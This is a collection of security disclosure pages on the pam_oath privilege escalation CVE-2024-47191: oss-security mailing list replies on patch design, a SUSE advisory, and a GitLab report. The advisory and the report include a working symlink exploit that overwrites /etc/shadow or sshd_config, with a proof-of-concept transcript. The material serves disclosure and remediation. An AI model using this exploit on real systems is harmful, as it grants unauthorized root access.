[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_21765b32_20250111_133254.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[<thread-prev]](6) [[thread-next>]](../../../2024/10/17/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20241015202135.GA8875@openwall.com>
Date: Tue, 15 Oct 2024 22:21:35 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-47191: Local root exploit in the PAM module pam_oath.so

On Tue, Oct 15, 2024 at 03:17:34PM -0400, Demi Marie Obenour wrote:
> What about opening the path one portion at a time using openat() with
> O_NOFOLLOW (and, as applicable, O_DIRECTORY),

As I understand, the SUSE patch already does that.

> ensuring that each portion
> is not "." or "..", does not contain "/", and is owned by either the
> target user or root?  This solves all race conditions and does not
> require spawning another process.

The detail here may be different.  And importantly, the final path
component must be owned strictly by the target user (not by root, unless
the target user is root).

On Tue, Oct 15, 2024 at 01:43:42PM +0200, Matthias Gerstner wrote:
> thanks for bringing up the potential problems with the patch we (SUSE)
> suggested. The missing drop of the ancillary group list has indeed been
> overlooked and will result in a lack of protection, since the
> "unprivileged" process will likely still be a member of the root group.

Both the SUSE and the upstream patch try to do two things at once: drop
privileges and access files safer.  Maybe I missed, but I think neither
of you specified whether these two things are intended as required
complementary parts (and what attacks would work if only one part worked
as intended) or as defense-in-depth.  You could want to clarify this.

> I will adjust the patch to contain this and one or two other adjustments
> and can then share it again here on the list.

Thanks.

> Indeed the patch does not take care of hard link attacks. Our products
> don't have any supported configuration without protected_hardlinks
> enabled, so we didn't have this in mind.
>
> The change to address this concern should be rather small, though, so I
> will try to incorporate it in a new version of the patch.

I guess it's checks of st_uid and st_nlink?  There are still some really
subtle issues like side effects on open() of a device file, which can be
hard linked too, but privilege dropping should mostly prevent them.  I'd
also add O_NOCTTY.

> On Tue, Oct 08, 2024 at 10:56:59PM +0200, Solar Designer wrote:
> > In general, switching to a user not only drops privileges for file
> > access, but also potentially exposes the process as that user's.
> > fsuid/fsgid switching is the safest in this respect (these were meant
> > just for file access purposes), but with other IDs (depending on which)
> > there may be extra exposure of the partially privileged log in process
> > to the user via /proc, kill(), setpriority(), etc. ... but thankfully
> > and hopefully not also via ptrace() on modern systems anymore.
>
> On modern Linux there shouldn't be a problem with dropping UID/GID, as
> the kernel will set the process's suid_dumpable attribute to the setting
> found in sys.fs.suid_dumpable, which should be 0. When this happens no
> ptrace() etc. will be possible on the end on the user/group that the
> process drops privileges to.

Yes, I am well aware of that, which is why I primarily mentioned other
exposures.  Linux's "dumpable" also affects much of /proc, but does not
affect e.g. kill() and setpriority().  And I was speaking in general,
not only about your patch, so not only about Linux.

> Dropping only the fsuid and fsgid on Linux would avoid any potential
> ptrace() dangers. The system calls are marked deprecated, though,
> and have unfortunate error handling. What makes me feel a bit uneasy
> about this approach is that the programmer has to make sure that
> the privilege drop context only ever deals with file system operations.

Yes, that's a trade-off.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from security.opensuse.org_a3c9915b_20250111_133258.html ===

[SUSE Security Team Blog](/)

[About](/about/)[Post Archive](/archive.html)

# oath-toolkit: privilege escalation in pam\_oath.so (CVE-2024-47191)

Oct 4, 2024
â¢ Matthias Gerstner

[#CVE](/archive.html#CVE)
[#local](/archive.html#local)
[#PAM](/archive.html#PAM)
[#symlink](/archive.html#symlink)

# Table of Contents

* [1) Introduction](#1-introduction)
* [2) Vulnerability Details](#2-vulnerability-details)
* [3) Embargo Process and Upstream Communication](#3-embargo-process-and-upstream-communication)
* [4) SUSE Bugfix](#4-suse-bugfix)
  + [Improved version of the Patch after Discussions in the Community](#improved-version-of-the-patch-after-discussions-in-the-community)
* [5) Upstream Bugfix](#5-upstream-bugfix)
* [6) Timeline](#6-timeline)
* [7) References](#7-references)
* [8) Change History](#8-change-history)

# 1) Introduction

[oath-toolkit](https://gitlab.com/oath-toolkit/oath-toolkit) contains libraries and utilities for managing one-time password
(OTP) authentication e.g. as a second factor to password authentication.
Fellow SUSE engineer Fabian Vogt approached our Security Team about the
projectâs PAM module. A couple of years ago, the module gained a feature which
allows to place the OTP state file (called usersfile) in the home directory of
the to-be-authenticated user. Fabian noticed that the PAM module performs
unsafe file operations in usersâ home directories. Since PAM stacks typically
run as root, this can easily cause security issues.

The feature in question has been introduced in oath-toolkit version 2.6.7 (via
[commit 60d9902b5c](https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/60d9902b5c20f27e70f8e9c816bfdc0467567e1a)). The following report is based on the most recent
oath-toolkit release tag for version 2.6.11.

# 2) Vulnerability Details

The PAM module is typically configured using a PAM stack configuration line
like this:

```
auth [user_unknown=ignore success=ok] pam_oath.so usersfile=${HOME}/user.oath window=20

```

The expansion logic of the path components `${HOME}` or `${USER}` is part of the
problematic feature that introduced the security issue.

The PAM module invokes a liboath library function called
`oath_authenticate_usersfile()` found in liboath/usersfile.c, which manages
all accesses to the usersfile. Privileges are not dropped, and the function is
not aware of the special privileged PAM context. All file accesses in the
function are naive and follow symlinks. The relevant file operations that are
carried out on successful OTP entry are as follows:

* opening of the usersfile via `fopen()` for reading (usersfile.c:470).
* opening of a lockfile parallel to the usersfile using a filename suffix â.lockâ via `fopen()` for writing (usersfile.c:332)
* locking of the lockfile using POSIX advisory locks via `fcntl()` (usersfile.c:350)
* creation of a new usersfile parallel to the old usersfile using a filename suffix â.newâ via `fopen()` (usersfile.c:372)
* changing ownership of the new usersfile to the to-be-authenticated user via `fchown()` (usersfile.c:394)
* renaming of the new usersfile to the old usersfile via `rename()` (usersfile.c:411)
* unlinking of the previously created lockfile (usersfile.c:423)

If this happens in a PAM stack running as root and the usersfile is located in
an unprivileged userâs home directory, then a simple root exploit is possible
by placing a symlink like this:

```
user$ ln -s /etc/shadow $HOME/user.oath.new

```

This will cause `/etc/shadow` to be overwritten and its ownership will be
changed to the to-be-authenticated user. The to-be-authenticated user can
obtain full root privileges. No race condition needs to be won and no
pathnames have to be guessed.

# 3) Embargo Process and Upstream Communication

Fabian Vogt first approached the main upstream author by email. Since we did not
get a reaction for several days, we created a [private Gitlab
issue](https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/43) in the upstream project, offering coordinated
disclosure. There was no reaction, thus we decided to handle the embargo and
bugfix ourselves, since we needed a fixed `pam_oath` module for our products. We
developed a comprehensive patch, described in Section 4) below.

We requested a CVE from Mitre for this issue and they assigned CVE-2024-47191.

As we were preparing to go public, the upstream author got pinged via private
channels and reacted to our report, preparing an upstream bugfix release
addressing the issue, described in Section 5) below.

Due to time constraints, we have decided to apply our SUSE bugfix to our
products for the time being, until we can evaluate the upstream solution in more
depth.

# 4) SUSE Bugfix

We developed a [patch](/download/0001-usersfile-fix-potential-security-issues-in-PAM-modul.patch) within SUSE to address the issue (note that
there is [an improved version](/download/0001-usersfile-fix-potential-security-issues-in-PAM-module-improved.patch) of the patch available by
now). The situation for the bugfix is more complex than it might look at first,
because many things are unclear or broken in the current source code:

* the PAM module cannot know for sure if the target usersfile is supposed to
  be owned by root or by the to-be-authenticated user, or even some unrelated
  user. The presence of a `${HOME}` path element makes it likely that the
  to-be-authenticated user is supposed to own the file. The presence of a
  `${USER}` element is not that clear, however.
* the locking mechanism used in the current source code is broken:
  + the usersfile is initially opened for reading and parsed without owning
    the lock (usersfile.c:470). A parallel task can be about to replace this
    file with a new version, thus a lost update can occur.
  + the lock file is unlinked again after the usersfile has been updated
    (usersfile.c:423). This breaks when another task is waiting on the
    now-unlinked lockfile, while a third task arrives, sees no lockfile and
    creates a new one.
* the lockfile is placed in the userâs home directory, possibly cluttering it.
  Cases like the home directory being a network file system (NFS, CIFS) would
  need to be considered. The unprivileged user might also prevent the privileged
  PAM stack from obtaining the lock, causing a local denial-of-service.

We decided to develop a patch that takes as many use cases as possible into
account, securing all operations while maintaining backwards compatibility.
With the patch, the usersfile path is safely traversed using the `*at` family
of system calls. Privileges will be dropped to the owner of the usersfile as an
additional security measure. The locking mechanism has been fixed to cover all
accesses to the usersfile. Instead of creating a separate lockfile, the
usersfile itself is used for locking, which avoids cluttering the home
directory. Additional sanity checks are added e.g. world-writable directory
components are denied. The patch employs Linux specific features (e.g. linking
files from `/proc/self/fd`), thus it no longer works for non-Linux systems. The
patch description and code comments contain more hints about the individual
decisions taken in this patch.

## Improved version of the Patch after Discussions in the Community

After [detailed discussions](https://www.openwall.com/lists/oss-security/2024/10/17/1)
on the oss-security mailing list a few shortcomings of the original SUSE patch
have been identified:

* the patch lacks logic to drop supplemental group membership, which typically
  results in the process retaining root group membership. Since the privilege
  drop in the patch only serves as a hardening this is not critical.
* the patch does not deal with potential hard link attacks. Hard link attacks
  are difficult to protect from, which is why on SUSE distributions the kernel
  sysctl âsys.fs.protected\_hardlinksâ is active by default. This way the
  kernel prevents dangerous uses of hardlinks.

For completeness we offer [an improved patch](/download/0001-usersfile-fix-potential-security-issues-in-PAM-module-improved.patch) that
addresses these two aspects. The approach taken in the patch - to accept any
ownership of the target file - makes it impossible to fully protect against
all hardlink attack scenarios, though. This is [outlined by Solar
Designer](https://www.openwall.com/lists/oss-security/2024/10/18/2) in the
thread on the oss-security mailing list.

# 5) Upstream Bugfix

Upstream developed an alternative solution, designed to be more portable and
cross-platform. This does not take into account all aspects that we considered
in Section 4), but should be sufficient to fix the specific security issue
described in this report.

This fix has been released in version 2.6.12 of oath-toolkit. Upstream has also
published an associated [Security Advisory](https://www.nongnu.org/oath-toolkit/security/CVE-2024-47191/).

# 6) Timeline

| 2024-08-08 | Fabian Vogt of SUSE sent an email to the main upstream author, describing the issue. The SUSE Security Team was involved as well. |
| --- | --- |
| 2024-08-20 | After not receiving any reply by email, we created a [private GitLab issue](https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/43) describing the vulnerability and offering coordinated disclosure according to our [disclosure policy](https://en.opensuse.org/openSUSE%3ASecurity_disclosure_policy). |
| 2024-08-28 | SUSE started developing an internal patch for the issue. |
| 2024-09-19 | Our internal patch was getting ready for publication. We added a comment in the private GitLab issue, granting two final weeks of embargo time before we will publish the vulnerability and the patch. We also shared the current patch in the issue. |
| 2024-09-19 | We requested a CVE for the issue from Mitre. |
| 2024-09-20 | Mitre assigned CVE-2024-47191. |
| 2024-09-29 | After being pinged via private channels, the main upstream author reacted to our communication and started preparing a bugfix release. |
| 2024-10-04 | Upstream published release 2.6.12 containing the bugfix. |

# 7) References

* [oath-toolkit repository](https://gitlab.com/oath-toolkit/oath-toolkit)
* [oath-toolkit vulnerable usersfile commit](https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/60d9902b5c20f27e70f8e9c816bfdc0467567e1a)
* [oath-toolkit upstream private issue](https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/43)
* [SUSE improved bugfix](/download/0001-usersfile-fix-potential-security-issues-in-PAM-module-improved.patch)
* [SUSE initial bugfix (old version)](/download/0001-usersfile-fix-potential-security-issues-in-PAM-modul.patch)
* [oath-toolkit Security Advisory for CVE-2024-47191](https://www.nongnu.org/oath-toolkit/security/CVE-2024-47191/)

# 8) Change History

| 2024-10-21 | Added [a section](#improved-version-of-the-patch-after-discussions-in-the-community) about shortcomings in the original SUSE patch and a link to the improved patch. |
| --- | --- |

## SUSE Security Team Blog

* SUSE Security Team
* security@suse.de

Open Source vulnerability reports and code review results.



=== Content from gitlab.com_a585ca71_20250111_133258.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Privilege escalation issue in pam\_oath with usersfile in ${HOME}

This report has already been sent to simon@josefsson.org by email on 2024-08-08.
Credits for the finding go to Fabian Vogt of SUSE Linux.

Since we did not get a reply by mail yet, the SUSE security team wants to
formally reach out to the oath-toolkit project this way.

## Coordinated Disclosure

We offer coordinated disclosure according to our
[disclosure policy](https://en.opensuse.org/openSUSE%3ASecurity_disclosure_policy).
For the coordinated disclosure process please answer
the following questions for us:

* Do you want to perform coordinated disclosure? If yes, then please
  communicate your desired coordinated release date (CRD) for publishing the
  security issue and any patches/updates. We offer to keep the issue
  private for up to 90 days (resulting in publication latest on 2024-11-06),
  but prefer to maintain shorter time frames of two to four weeks, if
  possible.

  If you don't want to perform coordinated disclosure then we will immediately
  publish all information we have on the
  [oss-security mailing list](https://www.openwall.com/lists/oss-security) and in
  our bug tracker.
* Do you acknowledge the individual findings? If so, will you assign a CVE
  identifier for the security issue? If yes, then please share the CVEs with
  us once they are assigned. Otherwise we can offer to request CVEs for you
  from the Mitre corporation.

## Issue Details (Authored by Fabian Vogt fvogt@suse.com)

One useful feature is that with [!12 (merged)](/oath-toolkit/oath-toolkit/-/merge_requests/12 "Added support for user based placeholder values in pam_oath usersfile string (v2)."),
users can manage their OTP configuration themselves by using a usersfile inside
the target user's home directory, e.g.:

```
auth required pam_oath.so usersfile=${HOME}/.pam_oath_usersfile window=20 digits=6
```

However, I noticed that pam\_oath also performs writes to it and surrounding
files:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/e3cb13b61dd452c903b442a7abf00a9c23d07212/liboath/usersfile.c#L498>

It looks like this in strace:

```
openat(AT_FDCWD, "/home/fabian/.pam_oath_usersfile", O_RDONLY) = 3
fstat(3, {st_mode=S_IFREG|0600, st_size=91, ...}) = 0
read(3, "HOTP/T30/6\tfabian\t-\t024b0c3de9c8"..., 4096) = 91
newfstatat(AT_FDCWD, "/etc/localtime", {st_mode=S_IFREG|0644, st_size=114, ...}, 0) = 0
umask(0177177)                          = 022
lseek(3, 0, SEEK_SET)                   = 0
openat(AT_FDCWD, "/home/fabian/.pam_oath_usersfile.lock", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 5
fcntl(5, F_SETLKW, {l_type=F_WRLCK, l_whence=SEEK_SET, l_start=0, l_len=0}) = 0
openat(AT_FDCWD, "/home/fabian/.pam_oath_usersfile.new", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
read(3, "HOTP/T30/6\tfabian\t-\t024b0c3de9c8"..., 4096) = 91
fstat(6, {st_mode=S_IFREG|0600, st_size=0, ...}) = 0
read(3, "", 4096)                       = 0
fstat(3, {st_mode=S_IFREG|0600, st_size=91, ...}) = 0
fchown(6, 1001, 1001)                   = 0
write(6, "HOTP/T30/6\tfabian\t-\t024b0c3de9c8"..., 91) = 91
fsync(6)                                = 0
close(6)                                = 0
rename("/home/fabian/.pam_oath_usersfile.new", "/home/fabian/.pam_oath_usersfile") = 0
close(5)                                = 0
unlink("/home/fabian/.pam_oath_usersfile.lock") = 0
umask(022)                              = 0177
```

All of those calls are performed with process privileges, which for PAM
authentication is typically root, so extra care needs to be taken when writing
to locations controlled by unprivileged users.

Here's a PoC that gives the user control over the host's SSH configuration by
creating a symlink that redirects open + write:

```
fabian@slemicro6:~> cat .pam_oath_usersfile
HOTP/T30/6      fabian  -       024b0c3de9c8b0dd4c6fd3a19b825dc063888bb81       900532  2024-08-08T12:09:00L

fabian@slemicro6:~> stat /etc/ssh/sshd_config
  File: /etc/ssh/sshd_config
  Size: 3727            Blocks: 8          IO Block: 4096   regular file
Device: 0,35    Inode: 6498        Links: 1
Access: (0640/-rw-r-----)  Uid: (    0/    root)   Gid: (    0/    root)
Context: unconfined_u:object_r:etc_t:s0
Access: 2024-08-08 12:28:47.768188578 +0000
Modify: 2024-08-08 12:28:47.778188578 +0000
Change: 2024-08-08 12:28:47.778188578 +0000
 Birth: 2024-08-08 12:28:47.768188578 +0000
fabian@slemicro6:~> ln -s /etc/ssh/sshd_config /home/fabian/.pam_oath_usersfile.new
< now perform a login with OTP validation >
fabian@slemicro6:~> stat /etc/ssh/sshd_config
  File: /etc/ssh/sshd_config
  Size: 91              Blocks: 8          IO Block: 4096   regular file
Device: 0,35    Inode: 6498        Links: 1
Access: (0640/-rw-r-----)  Uid: ( 1001/  fabian)   Gid: ( 1001/  fabian)
Context: unconfined_u:object_r:etc_t:s0
Access: 2024-08-08 12:29:52.228188578 +0000
Modify: 2024-08-08 12:30:37.728188578 +0000
Change: 2024-08-08 12:30:37.728188578 +0000
 Birth: 2024-08-08 12:28:47.768188578 +0000
fabian@slemicro6:~> cat .pam_oath_usersfile
HOTP/T30/6      fabian  -       024b0c3de9c8b0dd4c6fd3a19b825dc063888bb81       428534  2024-08-08T12:29:38L
```

Not only was the file overwritten with mostly user controlled content, it's
also owned by the unprivileged user now so they can perform whatever changes
they want.

Other ways for exploiting this are possible, like using the .lock file to
truncate arbitrary files or if the usersfile is not directly within ${HOME}
but in a subdirectory that could be a symlink as well.

The best option to handle this is probably to drop privileges before working
with untrusted paths, though I don't know how the implementation for that
would look like for pam\_oath.

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from www.openwall.com_209b90c2_20250111_133255.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2024/10/17/1) [[next>]](2) [[<thread-prev]](../../../2024/10/17/1) [[thread-next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20241018011316.MMXaKFiJ@steffen%sdaoden.eu>
Date: Fri, 18 Oct 2024 03:13:16 +0200
From: Steffen Nurpmeso <steffen@...oden.eu>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-47191: Local root exploit in the
 PAM module pam_oath.so

Hello.

Matthias Gerstner wrote in
 <ZxDKuqteocmdBDNx@...co.suse.de>:
 |On Tue, Oct 15, 2024 at 10:21:35PM +0200, Solar Designer wrote:
 |> On Tue, Oct 15, 2024 at 03:17:34PM -0400, Demi Marie Obenour wrote:
 ...
 |From 345ae06e0f698bdb1e9b4529e5a882f12df04426 Mon Sep 17 00:00:00 2001
 |From: Matthias Gerstner <matthias.gerstner@...e.de>
 |Date: Wed, 16 Oct 2024 09:58:35 +0200
 |Subject: [PATCH] usersfile: fix potential security issues in PAM module
 ...
 |+static int
 |+lock_usersfile (struct usersfile_ctx *ctx)
 |+{
 |+  /*
 |+   * There exist three file locking APIs:
 |+   *
 |+   * - flock(): this would be the simplest API, but it doesn't properly \
 |support
 |+   *   network file systems like NFS, which then causes a transparent \
 |fallback
 |+   *   to fcntl() file locking.
 |+   * - fcntl using F_SETLCK & friends: this lock is not based on the \
 |open file
 |+   *   description and thus cannot be inherited to child processes, \
 |which we
 |+   *   need to do.
 |+   * - fcntl using F_OFD_SETLCK & friends: this is a Linux specific \
 |lock that

It was added to and is part of POSIX.1-2024.

 |+   *   _is_ based on the open file description. It seems like the \
 |best bet for
 |+   *   our scenario.
 ...

--steffen
|
|Der Kragenbaer,                The moon bear,
|der holt sich munter           he cheerfully and one by one
|einen nach dem anderen runter  wa.ks himself off
|(By Robert Gernhardt)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_42bf9ca8_20250111_133254.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](../../../2024/10/05/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <Zv-9gAGM_X7QQShJ@suse.com>
Date: Fri, 4 Oct 2024 12:03:44 +0200
From: Johannes Segitz <jsegitz@...e.de>
To: oss-security@...ts.openwall.com
Subject: CVE-2024-47191: Local root exploit in the PAM module pam_oath.so

Hello list,

this is a report about a local root exploit in the PAM module `pam_oath.so`,
which is shipped as part of the oath-toolkit project [1].

You can also find a rendered HTML version of this report on our blog [5].

The vulnerability was discovered by Fabian Vogt of SUSE, and this report and
attached patch were authored by Matthias Gerstner of the SUSE Security Team.

Introduction
============

oath-toolkit[1] contains libraries and utilities for managing one-time password
(OTP) authentication e.g. as a second factor to password authentication.
Fellow SUSE engineer Fabian Vogt approached our Security Team about the
project's PAM module. A couple of years ago, the module gained a feature which
allows to place the OTP state file (called usersfile) in the home directory of
the to-be-authenticated user. Fabian noticed that the PAM module performs
unsafe file operations in users' home directories. Since PAM stacks typically
run as root, this can easily cause security issues.

The feature in question has been introduced in oath-toolkit version 2.6.7 (via
commit 60d9902b5c [2]). The following report is based on the most recent
oath-toolkit release tag for version 2.6.11.

Vulnerability Details
=====================

The PAM module is typically configured using a PAM stack configuration line
like this:

    auth [user_unknown=ignore success=ok] pam_oath.so usersfile=${HOME}/user.oath window=20

The expansion logic of the path components ${HOME} or ${USER} is part of the
problematic feature that introduced the security issue.

The PAM module invokes a liboath library function called
`oath_authenticate_usersfile()` found in liboath/usersfile.c, which manages
all accesses to the usersfile. Privileges are not dropped, and the function is
not aware of the special privileged PAM context. All file accesses in the
function are naive and follow symlinks. The relevant file operations that are
carried out on successful OTP entry are as follows:

- opening of the usersfile via `fopen()` for reading (usersfile.c:470).
- opening of a lockfile parallel to the usersfile using a filename suffix ".lock" via `fopen()` for writing (usersfile.c:332)
- locking of the lockfile using POSIX advisory locks via `fcntl()` (usersfile.c:350)
- creation of a new usersfile parallel to the old usersfile using a filename suffix ".new" via `fopen()` (usersfile.c:372)
- changing ownership of the new usersfile to the to-be-authenticated user via `fchown()` (usersfile.c:394)
- renaming of the new usersfile to the old usersfile via `rename()` (usersfile.c:411)
- unlinking of the previously created lockfile (usersfile.c:423)

If this happens in a PAM stack running as root and the usersfile is located in
an unprivileged user's home directory, then a simple root exploit is possible
by placing a symlink like this:

    user$ ln -s /etc/shadow $HOME/user.oath.new

This will cause /etc/shadow to be overwritten and its ownership will be
changed to the to-be-authenticated user. The to-be-authenticated user can
obtain full root privileges. No race condition needs to be won and no
pathnames have to be guessed.

Embargo Process and Upstream Communication
==========================================

Fabian Vogt first approached the main upstream author by email. Since we did not
get a reaction for several days, we created a private Gitlab issue in the
upstream project [3], offering coordinated disclosure. There was no reaction,
thus we decided to handle the embargo and bugfix ourselves, since we needed a
fixed `pam_oath` module for our products. We developed a comprehensive patch,
attached to this report and described in "SUSE Bugfix" below.

We requested a CVE from Mitre for this issue and they assigned CVE-2024-47191.

As we were preparing to go public, the upstream author got pinged via private
channels and reacted to our report, preparing an upstream bugfix release
addressing the issue, described in "Upstream Bugfix" below.

Due to time constraints, we have decided to apply our SUSE bugfix to our
products for the time being, until we can evaluate the upstream solution in more
depth.

SUSE Bugfix
===========

We developed the attached patch within SUSE to address the issue. The
situation for the bugfix is more complex than it might look at first, because
many things are unclear or broken in the current source code:

- the PAM module cannot know for sure if the target usersfile is supposed to
  be owned by root or by the to-be-authenticated user, or even some unrelated
  user. The presence of a ${HOME} path element makes it likely that the
  to-be-authenticated user is supposed to own the file. The presence of a
  ${USER} element is not that clear, however.
- the locking mechanism used in the current source code is broken:
  - the usersfile is initially opened for reading and parsed without owning
    the lock (usersfile.c:470). A parallel task can be about to replace this
    file with a new version, thus a lost update can occur.
  - the lock file is unlinked again after the usersfile has been updated
    (usersfile.c:423). This breaks when another task is waiting on the
    now-unlinked lockfile, while a third task arrives, sees no lockfile and
    creates a new one.
- the lockfile is placed in the user's home directory, possibly cluttering it.
  Cases like the home directory being a network file system (NFS, CIFS) would
  need to be considered. The unprivileged user might also prevent the privileged
  PAM stack from obtaining the lock, causing a local denial-of-service.

We decided to develop a patch that takes as many use cases as possible into
account, securing all operations while maintaining backwards compatibility.
With the patch, the usersfile path is safely traversed using the `*at` family
of system calls. Privileges will be dropped to the owner of the usersfile as an
